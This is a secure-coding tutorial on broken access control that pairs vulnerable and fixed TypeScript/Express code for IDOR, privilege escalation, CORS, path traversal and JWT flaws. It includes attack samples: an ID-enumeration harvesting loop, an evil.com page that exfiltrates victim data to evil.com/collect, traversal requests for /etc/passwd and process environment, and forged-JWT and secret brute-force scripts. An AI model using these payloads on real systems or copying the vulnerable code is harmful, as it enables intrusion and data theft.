---
title: "A01: Broken Access Control"
description: Deep dive into broken access control vulnerabilities including IDOR, privilege escalation, CORS misconfiguration, directory traversal, and JWT manipulation with TypeScript Express.js examples
tags: [security, owasp, access-control, idor, privilege-escalation, cors, jwt, directory-traversal]
difficulty: advanced
prerequisites:
  - owasp/index
  - Understanding of HTTP methods and REST APIs
  - TypeScript and Express.js fundamentals
lastReviewed: "2026-03-17"
---

# A01: Broken Access Control

Broken Access Control moved from position five in the 2017 OWASP Top 10 to the number one position in 2021. It has the most occurrences in applications, with over 318,000 CWE instances identified in the contributing dataset. Access control enforces policy such that users cannot act outside their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data, or performing a business function outside the user's limits.

## Understanding Access Control

Access control determines whether a user is allowed to perform a requested action. It sits at the intersection of authentication (who are you?) and authorization (what are you allowed to do?).

### Types of Access Control

**Vertical Access Control** — Restricts access to functions based on user role. An ordinary user should not access admin functions.

**Horizontal Access Control** — Restricts access to resources based on ownership. User A should not access User B's data.

**Context-Dependent Access Control** — Restricts actions based on the application state. A user should not be able to modify an order after it has been shipped.

## 1. Insecure Direct Object References (IDOR)

IDOR occurs when an application exposes a direct reference to an internal implementation object (such as a database key or file path) and fails to validate that the requesting user is authorized to access that specific object.

### Vulnerable Code

```typescript
import express, { Request, Response } from 'express';
import { Pool } from 'pg';

const app = express();
const pool = new Pool();

// VULNERABLE: No authorization check on the requested resource
app.get('/api/users/:userId/profile', async (req: Request, res: Response) => {
  const { userId } = req.params;

  const result = await pool.query(
    'SELECT id, name, email, ssn, address, phone FROM users WHERE id = $1',
    [userId]
  );

  if (result.rows.length === 0) {
    return res.status(404).json({ error: 'User not found' });
  }

  // Returns sensitive data for ANY user ID passed in the URL
  return res.json(result.rows[0]);
});

// VULNERABLE: Order retrieval without ownership check
app.get('/api/orders/:orderId', async (req: Request, res: Response) => {
  const { orderId } = req.params;

  const result = await pool.query(
    'SELECT * FROM orders WHERE id = $1',
    [orderId]
  );

  return res.json(result.rows[0]);
});
```

### Exploitation

An attacker who is logged in as User 42 can access another user's profile by simply changing the URL:

```
GET /api/users/42/profile   → Returns own profile (legitimate)
GET /api/users/43/profile   → Returns another user's profile (IDOR)
GET /api/users/1/profile    → Returns admin's profile (IDOR)
```

Automated exploitation with sequential ID enumeration:

```bash
for i in $(seq 1 10000); do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/$i/profile" >> harvested_data.json
done
```

### Secure Code

```typescript
import express, { Request, Response, NextFunction } from 'express';
import { Pool } from 'pg';

const app = express();
const pool = new Pool();

// Middleware: extract authenticated user from JWT
interface AuthenticatedRequest extends Request {
  user?: {
    id: number;
    role: string;
  };
}

// SECURE: Enforce ownership check
app.get(
  '/api/users/:userId/profile',
  authenticate, // verifies JWT and populates req.user
  async (req: AuthenticatedRequest, res: Response) => {
    const requestedUserId = parseInt(req.params.userId, 10);
    const authenticatedUserId = req.user!.id;
    const userRole = req.user!.role;

    // Authorization check: user can only access their own profile
    // unless they are an admin
    if (requestedUserId !== authenticatedUserId && userRole !== 'admin') {
      // Return 404 instead of 403 to avoid revealing that the resource exists
      return res.status(404).json({ error: 'Resource not found' });
    }

    // Only return fields appropriate for the requesting user's role
    const fields = userRole === 'admin'
      ? 'id, name, email, ssn, address, phone'
      : 'id, name, email, phone';

    const result = await pool.query(
      `SELECT ${fields} FROM users WHERE id = $1`,
      [requestedUserId]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Resource not found' });
    }

    return res.json(result.rows[0]);
  }
);

// SECURE: Order retrieval with ownership check
app.get(
  '/api/orders/:orderId',
  authenticate,
  async (req: AuthenticatedRequest, res: Response) => {
    const { orderId } = req.params;
    const userId = req.user!.id;

    // Include the user ID in the query itself
    const result = await pool.query(
      'SELECT * FROM orders WHERE id = $1 AND user_id = $2',
      [orderId, userId]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Order not found' });
    }

    return res.json(result.rows[0]);
  }
);
```

### Using Opaque Identifiers to Reduce IDOR Risk

Replace sequential integer IDs with UUIDs or other non-guessable identifiers:

```typescript
import { randomUUID } from 'crypto';

// When creating resources, use UUIDs instead of auto-increment
async function createOrder(userId: number, items: OrderItem[]): Promise<string> {
  const publicId = randomUUID(); // e.g., "f47ac10b-58cc-4372-a567-0e02b2c3d479"

  await pool.query(
    `INSERT INTO orders (public_id, user_id, items, created_at)
     VALUES ($1, $2, $3, NOW())`,
    [publicId, userId, JSON.stringify(items)]
  );

  return publicId; // Return this to the client, never the internal integer ID
}
```

> Using UUIDs is defense-in-depth, not a replacement for authorization checks. Always verify ownership even with opaque identifiers.

### Testing Methodology

1. **Identify endpoints that accept resource identifiers** — URL path parameters, query parameters, request body fields
2. **Create two test accounts** — Account A and Account B
3. **As Account A, access your own resources** — Note the identifiers used
4. **As Account A, attempt to access Account B's resources** — Replace identifiers
5. **Automate with Burp Suite's Authorize extension** — Replays requests with different session tokens
6. **Test parameter pollution** — Send the ID in multiple locations simultaneously (path, query, body) to see which the server trusts

---

## 2. Privilege Escalation

Privilege escalation occurs when a user gains access to resources or functions that should be restricted to a higher privilege level. Vertical privilege escalation is when a regular user accesses admin functions. Horizontal privilege escalation is when a user accesses another user's resources at the same privilege level.

### Vulnerable Code — Vertical Privilege Escalation

```typescript
// VULNERABLE: Role check only on the frontend, not the backend
app.post('/api/admin/users', async (req: AuthenticatedRequest, res: Response) => {
  // No role verification on the server side!
  // The frontend hides the admin panel, but the API endpoint is unprotected
  const { name, email, role } = req.body;

  const result = await pool.query(
    'INSERT INTO users (name, email, role) VALUES ($1, $2, $3) RETURNING id',
    [name, email, role]
  );

  return res.status(201).json({ id: result.rows[0].id });
});

// VULNERABLE: Client-controlled role assignment
app.put('/api/users/me', async (req: AuthenticatedRequest, res: Response) => {
  const userId = req.user!.id;
  const { name, email, role } = req.body; // User can set their own role!

  await pool.query(
    'UPDATE users SET name = $1, email = $2, role = $3 WHERE id = $4',
    [name, email, role, userId]
  );

  return res.json({ message: 'Profile updated' });
});
```

### Exploitation

```bash
# Regular user discovers the admin endpoint and sends a direct request
curl -X POST https://target.com/api/admin/users \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Evil Admin","email":"evil@attacker.com","role":"admin"}'

# Self-escalation: user updates their own role
curl -X PUT https://target.com/api/users/me \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Normal User","email":"user@example.com","role":"admin"}'
```

### Secure Code

```typescript
import express from 'express';

// Role hierarchy for comparison
const ROLE_HIERARCHY: Record<string, number> = {
  viewer: 0,
  editor: 1,
  manager: 2,
  admin: 3,
  superadmin: 4,
};

// Authorization middleware factory
function requireRole(...allowedRoles: string[]) {
  return (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
    const userRole = req.user?.role;

    if (!userRole || !allowedRoles.includes(userRole)) {
      // Log the access attempt for security monitoring
      logger.warn('Unauthorized access attempt', {
        userId: req.user?.id,
        userRole,
        requiredRoles: allowedRoles,
        path: req.path,
        method: req.method,
        ip: req.ip,
        timestamp: new Date().toISOString(),
      });

      return res.status(403).json({ error: 'Forbidden' });
    }

    next();
  };
}

// SECURE: Admin endpoint with role check
app.post(
  '/api/admin/users',
  authenticate,
  requireRole('admin', 'superadmin'),
  async (req: AuthenticatedRequest, res: Response) => {
    const { name, email, role } = req.body;

    // Prevent creation of users with higher privilege than the requester
    const requesterLevel = ROLE_HIERARCHY[req.user!.role] ?? 0;
    const targetLevel = ROLE_HIERARCHY[role] ?? 0;

    if (targetLevel >= requesterLevel) {
      return res.status(403).json({
        error: 'Cannot create a user with equal or higher privileges',
      });
    }

    const result = await pool.query(
      'INSERT INTO users (name, email, role) VALUES ($1, $2, $3) RETURNING id',
      [name, email, role]
    );

    return res.status(201).json({ id: result.rows[0].id });
  }
);

// SECURE: Profile update that ignores role field
app.put(
  '/api/users/me',
  authenticate,
  async (req: AuthenticatedRequest, res: Response) => {
    const userId = req.user!.id;

    // Whitelist only the fields users are allowed to update
    const allowedFields = ['name', 'email', 'phone', 'address'];
    const updates: Record<string, unknown> = {};

    for (const field of allowedFields) {
      if (req.body[field] !== undefined) {
        updates[field] = req.body[field];
      }
    }

    if (Object.keys(updates).length === 0) {
      return res.status(400).json({ error: 'No valid fields to update' });
    }

    const setClauses = Object.keys(updates).map(
      (key, i) => `${key} = $${i + 1}`
    );
    const values = [...Object.values(updates), userId];

    await pool.query(
      `UPDATE users SET ${setClauses.join(', ')} WHERE id = $${values.length}`,
      values
    );

    return res.json({ message: 'Profile updated' });
  }
);
```

### Testing Methodology

1. **Map all endpoints and their required roles** — Build a matrix of endpoints vs. roles
2. **Test each endpoint with each role** — Automated with Burp Suite or custom scripts
3. **Look for hidden admin endpoints** — Check JavaScript bundles, API documentation, common paths (`/admin`, `/internal`, `/debug`)
4. **Test mass assignment** — Send extra fields in update requests (role, isAdmin, permissions)
5. **Check for parameter tampering** — Modify role or permission values in JWTs, cookies, or request bodies
6. **Test HTTP method override** — Some frameworks allow `X-HTTP-Method-Override` headers

---

## 3. CORS Misconfiguration

Cross-Origin Resource Sharing (CORS) is a mechanism that allows a server to indicate which origins are permitted to read its responses. Misconfigured CORS can allow an attacker's website to make authenticated requests to your API and read the responses.

### Vulnerable Code

```typescript
// VULNERABLE: Reflecting the Origin header without validation
app.use((req: Request, res: Response, next: NextFunction) => {
  // Dynamically reflects ANY origin — effectively disables CORS protection
  const origin = req.headers.origin;
  res.setHeader('Access-Control-Allow-Origin', origin || '*');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

// VULNERABLE: Regex that can be bypassed
app.use((req: Request, res: Response, next: NextFunction) => {
  const origin = req.headers.origin || '';
  // Intended to match *.example.com but matches evil-example.com too
  if (origin.match(/example\.com$/)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  next();
});

// VULNERABLE: Null origin allowed
app.use((req: Request, res: Response, next: NextFunction) => {
  const origin = req.headers.origin || '';
  const allowed = ['https://app.example.com', 'null'];
  if (allowed.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  next();
});
```

### Exploitation

An attacker hosts a malicious page that makes cross-origin requests:

```html
<!-- Hosted on https://evil.com -->
<script>
  // If CORS is misconfigured to reflect any origin with credentials,
  // this will succeed and the attacker can read the response
  fetch('https://api.example.com/api/users/me', {
    credentials: 'include',  // Sends cookies
  })
    .then(response => response.json())
    .then(data => {
      // Exfiltrate the victim's data
      fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(data),
      });
    });
</script>
```

For the `null` origin bypass, use a sandboxed iframe:

```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://api.example.com/api/users/me', {
      credentials: 'include',
    })
    .then(r => r.json())
    .then(d => parent.postMessage(d, '*'));
  </script>
"></iframe>
```

### Secure Code

```typescript
import cors from 'cors';

// SECURE: Explicit allowlist of origins
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
  'https://staging.example.com',
]);

// In development only
if (process.env.NODE_ENV === 'development') {
  ALLOWED_ORIGINS.add('http://localhost:3000');
  ALLOWED_ORIGINS.add('http://localhost:5173');
}

app.use(
  cors({
    origin: (origin, callback) => {
      // Allow requests with no origin (server-to-server, curl, etc.)
      // only in non-production environments
      if (!origin && process.env.NODE_ENV !== 'production') {
        return callback(null, true);
      }

      if (!origin || !ALLOWED_ORIGINS.has(origin)) {
        return callback(new Error('Not allowed by CORS'));
      }

      return callback(null, true);
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
    exposedHeaders: ['X-Request-ID', 'X-RateLimit-Remaining'],
    maxAge: 86400, // Cache preflight for 24 hours
  })
);
```

### Testing Methodology

1. **Send requests with various Origin headers:**
   ```bash
   curl -H "Origin: https://evil.com" -v https://api.target.com/endpoint
   ```
2. **Check if the response reflects the origin** — Look for `Access-Control-Allow-Origin: https://evil.com`
3. **Test with null origin** — `Origin: null`
4. **Test subdomain bypasses** — `Origin: https://evil-example.com`, `Origin: https://example.com.evil.com`
5. **Check for wildcard with credentials** — `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` (browsers block this, but the misconfiguration reveals weak CORS logic)
6. **Test preflight caching** — Long `Access-Control-Max-Age` values can persist CORS misconfigurations

---

## 4. Directory Traversal (Path Traversal)

Directory traversal (also known as path traversal) allows attackers to access files and directories outside the intended directory by manipulating file path references with `../` sequences or absolute paths.

### Vulnerable Code

```typescript
import path from 'path';
import fs from 'fs/promises';

// VULNERABLE: Direct use of user input in file path
app.get('/api/files/:filename', async (req: Request, res: Response) => {
  const { filename } = req.params;
  const filePath = path.join('/app/uploads', filename);

  try {
    const content = await fs.readFile(filePath, 'utf-8');
    return res.send(content);
  } catch {
    return res.status(404).json({ error: 'File not found' });
  }
});

// VULNERABLE: Using query parameter for file download
app.get('/api/download', async (req: Request, res: Response) => {
  const file = req.query.file as string;
  const filePath = `/app/reports/${file}`;

  res.download(filePath);
});

// VULNERABLE: Template rendering with user-controlled path
app.get('/docs/:page', async (req: Request, res: Response) => {
  const { page } = req.params;
  res.render(`docs/${page}`); // Template injection via path traversal
});
```

### Exploitation

```bash
# Read /etc/passwd on Linux
curl "https://target.com/api/files/..%2F..%2F..%2Fetc%2Fpasswd"

# Read application source code
curl "https://target.com/api/files/..%2F..%2Fapp%2Findex.js"

# Read environment variables
curl "https://target.com/api/files/..%2F..%2F..%2Fproc%2Fself%2Fenviron"

# URL-encoded double traversal
curl "https://target.com/api/files/..%252f..%252f..%252fetc%252fpasswd"

# Null byte injection (older systems)
curl "https://target.com/api/files/..%2F..%2Fetc%2Fpasswd%00.png"

# Windows path traversal
curl "https://target.com/api/files/..%5C..%5C..%5CWindows%5Csystem.ini"
```

### Secure Code

```typescript
import path from 'path';
import fs from 'fs/promises';

const UPLOADS_DIR = path.resolve('/app/uploads');

// SECURE: Validate that resolved path stays within the allowed directory
app.get('/api/files/:filename', async (req: Request, res: Response) => {
  const { filename } = req.params;

  // Reject filenames with path separators or traversal sequences
  if (
    filename.includes('..') ||
    filename.includes('/') ||
    filename.includes('\\') ||
    filename.includes('\0')
  ) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  // Resolve the full path and verify it's within the uploads directory
  const resolvedPath = path.resolve(UPLOADS_DIR, filename);

  if (!resolvedPath.startsWith(UPLOADS_DIR + path.sep)) {
    logger.warn('Path traversal attempt', {
      filename,
      resolvedPath,
      ip: req.ip,
    });
    return res.status(400).json({ error: 'Invalid filename' });
  }

  // Verify the file exists and is a regular file (not a symlink, directory, etc.)
  try {
    const stat = await fs.lstat(resolvedPath);

    if (!stat.isFile()) {
      return res.status(400).json({ error: 'Invalid file type' });
    }

    // Check that symlinks don't point outside the uploads directory
    if (stat.isSymbolicLink()) {
      const realPath = await fs.realpath(resolvedPath);
      if (!realPath.startsWith(UPLOADS_DIR + path.sep)) {
        return res.status(400).json({ error: 'Invalid file' });
      }
    }

    const content = await fs.readFile(resolvedPath, 'utf-8');
    return res.send(content);
  } catch {
    return res.status(404).json({ error: 'File not found' });
  }
});

// SECURE: Allowlist-based file serving
const ALLOWED_REPORTS = new Map<string, string>([
  ['annual-2024', '/app/reports/annual-2024.pdf'],
  ['quarterly-q4', '/app/reports/quarterly-q4-2024.pdf'],
]);

app.get('/api/download', async (req: Request, res: Response) => {
  const fileKey = req.query.file as string;
  const filePath = ALLOWED_REPORTS.get(fileKey);

  if (!filePath) {
    return res.status(404).json({ error: 'Report not found' });
  }

  res.download(filePath);
});
```

### Testing Methodology

1. **Identify file-serving endpoints** — Any endpoint that accepts a filename or path
2. **Try basic traversal** — `../../../etc/passwd`
3. **Try encoded traversal** — URL encoding (`%2e%2e%2f`), double encoding (`%252e%252e%252f`), Unicode encoding
4. **Try OS-specific paths** — Windows (`..\..\`), Unix (`../`)
5. **Try null bytes** — `../../etc/passwd%00.png` (effective on older systems)
6. **Check for symlink following** — If you can upload a symlink, check if the server follows it
7. **Use Burp Intruder** with a path traversal wordlist

---

## 5. JWT Manipulation

JSON Web Tokens are widely used for authentication and authorization. When improperly implemented, JWTs can be manipulated to bypass access controls.

### Vulnerable Code

```typescript
import jwt from 'jsonwebtoken';

const SECRET = 'my-secret-key'; // Weak secret

// VULNERABLE: The "none" algorithm is not explicitly rejected
app.post('/api/login', async (req: Request, res: Response) => {
  const { email, password } = req.body;
  const user = await authenticateUser(email, password);

  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const token = jwt.sign(
    { userId: user.id, role: user.role },
    SECRET,
    { expiresIn: '365d' } // Token valid for a year — far too long
  );

  return res.json({ token });
});

// VULNERABLE: Using jwt.decode instead of jwt.verify
app.get('/api/profile', (req: Request, res: Response) => {
  const token = req.headers.authorization?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  // jwt.decode does NOT verify the signature!
  const decoded = jwt.decode(token) as any;
  const userId = decoded.userId;

  // ... fetch and return user profile
});

// VULNERABLE: Algorithm confusion — accepts both HS256 and RS256
// If the server uses RS256 with a public key, an attacker can:
// 1. Get the public key (often publicly available)
// 2. Sign a forged token with HS256 using the public key as the HMAC secret
function verifyToken(token: string): any {
  const publicKey = fs.readFileSync('/app/keys/public.pem', 'utf-8');
  // Does not specify the expected algorithm
  return jwt.verify(token, publicKey);
}
```

### Exploitation

**The "none" Algorithm Attack:**

```python
import base64
import json

# Craft a JWT with the "none" algorithm
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b'=')

payload = base64.urlsafe_b64encode(
    json.dumps({"userId": 1, "role": "admin"}).encode()
).rstrip(b'=')

# No signature needed
forged_token = f"{header.decode()}.{payload.decode()}."
```

**Algorithm Confusion Attack (RS256 to HS256):**

```python
import jwt
import requests

# Step 1: Obtain the public key
public_key = requests.get('https://target.com/.well-known/jwks.json').text

# Step 2: Sign a forged token using HS256 with the public key as secret
forged_token = jwt.encode(
    {"userId": 1, "role": "admin"},
    public_key,
    algorithm="HS256"
)
```

**JWT Secret Brute Force:**

```bash
# Using hashcat to brute-force weak JWT secrets
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

### Secure Code

```typescript
import { SignJWT, jwtVerify, createLocalJWKSet, errors } from 'jose';
import { randomBytes } from 'crypto';

// Use a cryptographically strong secret (at least 256 bits for HS256)
const JWT_SECRET = new TextEncoder().encode(
  process.env.JWT_SECRET // Must be at least 32 bytes of high-entropy data
);

// If using asymmetric keys (recommended for distributed systems):
// Generate with: openssl genpkey -algorithm Ed25519 -out private.pem
// Extract public: openssl pkey -in private.pem -pubout -out public.pem

interface TokenPayload {
  sub: string;      // Subject (user ID)
  role: string;
  permissions: string[];
  jti: string;      // JWT ID for revocation
  iat: number;      // Issued at
  exp: number;      // Expiration
}

// SECURE: Token creation with explicit algorithm and short expiration
async function createAccessToken(user: {
  id: string;
  role: string;
  permissions: string[];
}): Promise<string> {
  const jti = randomBytes(16).toString('hex');

  const token = await new SignJWT({
    role: user.role,
    permissions: user.permissions,
    jti,
  })
    .setProtectedHeader({ alg: 'HS256', typ: 'JWT' })
    .setSubject(user.id)
    .setIssuedAt()
    .setExpirationTime('15m')  // Short-lived access token
    .setIssuer('https://api.example.com')
    .setAudience('https://app.example.com')
    .sign(JWT_SECRET);

  return token;
}

// SECURE: Token verification with explicit algorithm restriction
async function verifyAccessToken(token: string): Promise<TokenPayload> {
  try {
    const { payload } = await jwtVerify(token, JWT_SECRET, {
      algorithms: ['HS256'],              // Explicitly restrict algorithm
      issuer: 'https://api.example.com',  // Verify issuer
      audience: 'https://app.example.com', // Verify audience
      clockTolerance: 30,                 // Allow 30 seconds of clock skew
      maxTokenAge: '15m',                 // Reject tokens older than 15 minutes
    });

    // Check if the token has been revoked
    const isRevoked = await tokenRevocationList.check(payload.jti as string);
    if (isRevoked) {
      throw new Error('Token has been revoked');
    }

    return payload as unknown as TokenPayload;
  } catch (error) {
    if (error instanceof errors.JWTExpired) {
      throw new Error('Token expired');
    }
    if (error instanceof errors.JWTClaimValidationFailed) {
      throw new Error('Invalid token claims');
    }
    throw new Error('Invalid token');
  }
}

// SECURE: Authentication middleware
async function authenticate(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> {
  const authHeader = req.headers.authorization;

  if (!authHeader?.startsWith('Bearer ')) {
    res.status(401).json({ error: 'Missing authorization header' });
    return;
  }

  const token = authHeader.slice(7);

  try {
    const payload = await verifyAccessToken(token);

    req.user = {
      id: parseInt(payload.sub, 10),
      role: payload.role,
    };

    next();
  } catch (error) {
    res.status(401).json({ error: 'Invalid or expired token' });
  }
}

// SECURE: Refresh token rotation
async function createRefreshToken(userId: string): Promise<string> {
  const tokenFamily = randomBytes(16).toString('hex');
  const jti = randomBytes(16).toString('hex');

  const token = await new SignJWT({ family: tokenFamily })
    .setProtectedHeader({ alg: 'HS256', typ: 'JWT' })
    .setSubject(userId)
    .setJwtId(jti)
    .setIssuedAt()
    .setExpirationTime('7d')
    .sign(JWT_SECRET);

  // Store the token family and JTI in the database
  await pool.query(
    `INSERT INTO refresh_tokens (jti, user_id, family, expires_at)
     VALUES ($1, $2, $3, NOW() + INTERVAL '7 days')`,
    [jti, userId, tokenFamily]
  );

  return token;
}

async function rotateRefreshToken(
  oldToken: string
): Promise<{ accessToken: string; refreshToken: string }> {
  const { payload } = await jwtVerify(oldToken, JWT_SECRET, {
    algorithms: ['HS256'],
  });

  const oldJti = payload.jti as string;
  const family = (payload as any).family;

  // Check if this refresh token has been used before (replay detection)
  const existing = await pool.query(
    'SELECT used FROM refresh_tokens WHERE jti = $1',
    [oldJti]
  );

  if (existing.rows.length === 0) {
    throw new Error('Refresh token not found');
  }

  if (existing.rows[0].used) {
    // This token was already used — potential token theft!
    // Invalidate ALL tokens in this family
    await pool.query(
      'DELETE FROM refresh_tokens WHERE family = $1',
      [family]
    );

    logger.error('Refresh token reuse detected — possible token theft', {
      userId: payload.sub,
      family,
      jti: oldJti,
    });

    throw new Error('Token reuse detected');
  }

  // Mark the old token as used
  await pool.query(
    'UPDATE refresh_tokens SET used = true WHERE jti = $1',
    [oldJti]
  );

  const userId = payload.sub as string;
  const user = await getUserById(userId);

  const accessToken = await createAccessToken(user);
  const refreshToken = await createRefreshToken(userId);

  return { accessToken, refreshToken };
}
```

### Testing Methodology

1. **Decode the token** — Use jwt.io or `jose` to inspect claims, algorithm, expiration
2. **Test the "none" algorithm** — Remove the signature and set `alg` to `none`
3. **Test algorithm confusion** — Switch RS256 to HS256 and sign with the public key
4. **Brute-force weak secrets** — Use hashcat or jwt_tool with common password lists
5. **Check token expiration** — Use expired tokens and verify they are rejected
6. **Test claim manipulation** — Modify the `role`, `sub`, or `permissions` claims
7. **Test token reuse** — Use the same refresh token twice to test replay detection
8. **Check for JWK endpoint** — `/.well-known/jwks.json` or `/.well-known/openid-configuration`

---

## 6. Forced Browsing

Forced browsing is an attack where an attacker accesses resources that are not linked or referenced in the application but exist on the server.

### Vulnerable Code

```typescript
// VULNERABLE: Relying on obscurity rather than access controls
// These endpoints exist but are not linked anywhere in the UI

app.get('/api/debug/users', async (req: Request, res: Response) => {
  const users = await pool.query('SELECT * FROM users');
  res.json(users.rows);
});

app.get('/api/internal/metrics', async (req: Request, res: Response) => {
  res.json(await getMetrics());
});

// Backup files left on the server
app.use(express.static('/app/public'));
// Files like /backup.sql, /config.yml.bak, /.env are accessible
```

### Secure Code

```typescript
// SECURE: All routes require authentication and authorization

// Remove debug/internal routes in production
if (process.env.NODE_ENV !== 'production') {
  app.get('/api/debug/users', requireRole('superadmin'), debugUsersHandler);
}

// Internal routes behind VPN/service mesh, not exposed to the internet
const internalRouter = express.Router();
internalRouter.use(requireInternalNetwork); // Check source IP or mTLS cert
internalRouter.get('/metrics', getMetricsHandler);

// Static file serving with explicit allowlist
const ALLOWED_STATIC_EXTENSIONS = new Set(['.html', '.css', '.js', '.png', '.jpg', '.svg', '.ico']);

app.use((req: Request, res: Response, next: NextFunction) => {
  const ext = path.extname(req.path).toLowerCase();
  if (req.path.startsWith('/static/') && ALLOWED_STATIC_EXTENSIONS.has(ext)) {
    return express.static('/app/public')(req, res, next);
  }
  next();
});

// Block access to sensitive files
app.use((req: Request, res: Response, next: NextFunction) => {
  const blocked = ['.env', '.git', '.sql', '.bak', '.log', '.yml', '.yaml', '.toml', '.config'];
  const ext = path.extname(req.path).toLowerCase();
  const basename = path.basename(req.path).toLowerCase();

  if (blocked.includes(ext) || blocked.some(b => basename.endsWith(b))) {
    return res.status(404).json({ error: 'Not found' });
  }
  next();
});
```

---

## 7. HTTP Method Tampering

Some applications only check authorization for certain HTTP methods, allowing attackers to bypass controls by using a different method.

### Vulnerable Code

```typescript
// VULNERABLE: Only checking authorization on POST, not PUT or PATCH
app.post('/api/settings', requireRole('admin'), updateSettingsHandler);

// But the same handler is also mounted without auth on PUT
app.put('/api/settings', updateSettingsHandler); // No auth!

// VULNERABLE: HEAD and OPTIONS bypass
// Some WAFs and middleware only check GET and POST
```

### Secure Code

```typescript
// SECURE: Apply authorization to all methods for a route
const settingsRouter = express.Router();
settingsRouter.use(authenticate, requireRole('admin'));
settingsRouter.post('/', updateSettingsHandler);
settingsRouter.put('/', updateSettingsHandler);
settingsRouter.patch('/', patchSettingsHandler);

// Reject unsupported methods explicitly
settingsRouter.all('/', (req: Request, res: Response) => {
  res.status(405).json({
    error: 'Method not allowed',
    allowed: ['POST', 'PUT', 'PATCH'],
  });
});

app.use('/api/settings', settingsRouter);

// Global middleware to block method override headers in production
app.use((req: Request, res: Response, next: NextFunction) => {
  if (req.headers['x-http-method-override'] || req.headers['x-method-override']) {
    return res.status(400).json({ error: 'Method override not allowed' });
  }
  next();
});
```

---

## Comprehensive Access Control Middleware

Here is a complete, reusable access control system that addresses all the vulnerabilities discussed above:

```typescript
import { Request, Response, NextFunction } from 'express';

interface Permission {
  resource: string;
  action: 'create' | 'read' | 'update' | 'delete' | 'list' | 'admin';
  condition?: (req: AuthenticatedRequest, resourceOwnerId?: string) => boolean;
}

interface RoleDefinition {
  name: string;
  permissions: Permission[];
  inherits?: string[];
}

class AccessControlManager {
  private roles = new Map<string, RoleDefinition>();

  registerRole(role: RoleDefinition): void {
    this.roles.set(role.name, role);
  }

  private getEffectivePermissions(roleName: string): Permission[] {
    const role = this.roles.get(roleName);
    if (!role) return [];

    let permissions = [...role.permissions];

    if (role.inherits) {
      for (const parentRole of role.inherits) {
        permissions = [...permissions, ...this.getEffectivePermissions(parentRole)];
      }
    }

    return permissions;
  }

  check(
    resource: string,
    action: Permission['action'],
    getResourceOwnerId?: (req: AuthenticatedRequest) => Promise<string | null>
  ) {
    return async (
      req: AuthenticatedRequest,
      res: Response,
      next: NextFunction
    ): Promise<void> => {
      const userRole = req.user?.role;

      if (!userRole) {
        res.status(401).json({ error: 'Authentication required' });
        return;
      }

      const permissions = this.getEffectivePermissions(userRole);

      const matchingPermission = permissions.find(
        (p) => p.resource === resource && p.action === action
      );

      if (!matchingPermission) {
        logger.warn('Access denied', {
          userId: req.user?.id,
          role: userRole,
          resource,
          action,
          path: req.path,
        });
        res.status(403).json({ error: 'Forbidden' });
        return;
      }

      // Check ownership condition if applicable
      if (matchingPermission.condition) {
        let resourceOwnerId: string | undefined;

        if (getResourceOwnerId) {
          const ownerId = await getResourceOwnerId(req);
          if (ownerId) resourceOwnerId = ownerId;
        }

        if (!matchingPermission.condition(req, resourceOwnerId)) {
          res.status(403).json({ error: 'Forbidden' });
          return;
        }
      }

      next();
    };
  }
}

// Usage
const acl = new AccessControlManager();

acl.registerRole({
  name: 'viewer',
  permissions: [
    { resource: 'profile', action: 'read', condition: (req, ownerId) => req.user!.id.toString() === ownerId },
    { resource: 'orders', action: 'read', condition: (req, ownerId) => req.user!.id.toString() === ownerId },
    { resource: 'orders', action: 'list', condition: (req, ownerId) => req.user!.id.toString() === ownerId },
  ],
});

acl.registerRole({
  name: 'editor',
  inherits: ['viewer'],
  permissions: [
    { resource: 'profile', action: 'update', condition: (req, ownerId) => req.user!.id.toString() === ownerId },
    { resource: 'orders', action: 'create' },
  ],
});

acl.registerRole({
  name: 'admin',
  inherits: ['editor'],
  permissions: [
    { resource: 'profile', action: 'read' },   // No ownership condition — can read any profile
    { resource: 'profile', action: 'update' },
    { resource: 'orders', action: 'read' },
    { resource: 'orders', action: 'list' },
    { resource: 'orders', action: 'delete' },
    { resource: 'users', action: 'admin' },
  ],
});

// Apply to routes
app.get(
  '/api/users/:userId/profile',
  authenticate,
  acl.check('profile', 'read', async (req) => req.params.userId),
  getProfileHandler
);

app.put(
  '/api/users/:userId/profile',
  authenticate,
  acl.check('profile', 'update', async (req) => req.params.userId),
  updateProfileHandler
);

app.get(
  '/api/orders/:orderId',
  authenticate,
  acl.check('orders', 'read', async (req) => {
    const order = await pool.query('SELECT user_id FROM orders WHERE id = $1', [req.params.orderId]);
    return order.rows[0]?.user_id?.toString() || null;
  }),
  getOrderHandler
);
```

## Prevention Checklist

- [ ] Deny by default — require explicit grants for every resource and action
- [ ] Enforce authorization on the server side for every request, not just in the UI
